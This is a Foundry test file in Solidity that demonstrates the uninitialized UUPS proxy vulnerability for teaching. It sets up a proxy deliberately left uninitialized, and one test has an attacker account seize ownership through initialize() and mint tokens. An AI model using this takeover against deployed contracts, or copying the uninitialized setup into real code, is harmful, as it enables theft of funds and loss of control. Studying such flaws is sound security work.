// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {ProxyToken} from "../../src/Proxy/Uninitialized/ProxyToken.sol";
import {UUPSProxy} from "../../src/Proxy/Uninitialized/UUPS.sol";

// These tests demonstrate the issue of an uninitialized UUPS proxy
// The solution is to initialize the UUPS proxy properly (by calling `initialize()` via the proxy contract)
// Multiple white hat bounties have been claimed for this issue

interface IProxyToken {
    function balanceOf(address) external returns (uint256);
}

contract UUPS_unintialized_Test is Test {
    ProxyToken public proxyToken;
    UUPSProxy public proxy;

    address public alice;

    function setUp() public {
        alice = address(0xABCDEF);

        // Deploy initial implementation and proxy contract
        proxyToken = new ProxyToken(); // Deploy implementation contract
        proxy = new UUPSProxy(address(proxyToken), ""); // Deploy ERC1967 proxy contract with testtoken logic as implementation

        vm.label(address(proxy), "proxy");
        vm.label(address(proxyToken), "Token");
        vm.label(address(alice), "alice");
    }

    // Step 1: Initialize the proxy and verify the owner is this contract
    function testCorrectInitialization() public {
        (bool validResponse, bytes memory returnedData) = address(proxy).call(abi.encodeWithSignature("initialize()"));
        assertTrue(validResponse);
        (validResponse, returnedData) = address(proxy).call(abi.encodeWithSignature("owner()"));
        assertTrue(validResponse);
        address owner = abi.decode(returnedData, (address));

        // owner of UUPSProxy contract should be this contract
        assertEq(owner, address(this));

        (validResponse, returnedData) = address(proxy).call(abi.encodeWithSignature("mint(uint256)", uint256(10 ether)));
        assertTrue(validResponse);

        // confirm this address has 10 ether worth of tokens
        assertEq(IProxyToken(address(proxy)).balanceOf(address(this)), 10 ether);
    }

    // Step 2: Initialize proxy as Alice and verify the owner is Alice
    // The owner forgot to initialize the proxy so the first step for the attacker is to become the owner
    // Confirm Alice got the tokens minted in the initialize() function
    function testUnInitialized() public {
        vm.prank(address(alice));
        (bool validResponse, bytes memory returnedData) = address(proxy).call(abi.encodeWithSignature("initialize()"));
        assertTrue(validResponse);
        (validResponse, returnedData) = address(proxy).call(abi.encodeWithSignature("owner()"));
        assertTrue(validResponse);
        address owner = abi.decode(returnedData, (address));

        // owner of UUPSProxy contract will be alice
        assertEq(owner, address(alice));

        vm.prank(address(alice));
        (validResponse, returnedData) = address(proxy).call(abi.encodeWithSignature("mint(uint256)", uint256(10 ether)));
        assertTrue(validResponse);

        // confirm that alice has 10 ether worth of tokens
        assertEq(IProxyToken(address(proxy)).balanceOf(address(alice)), 10 ether);
    }
}
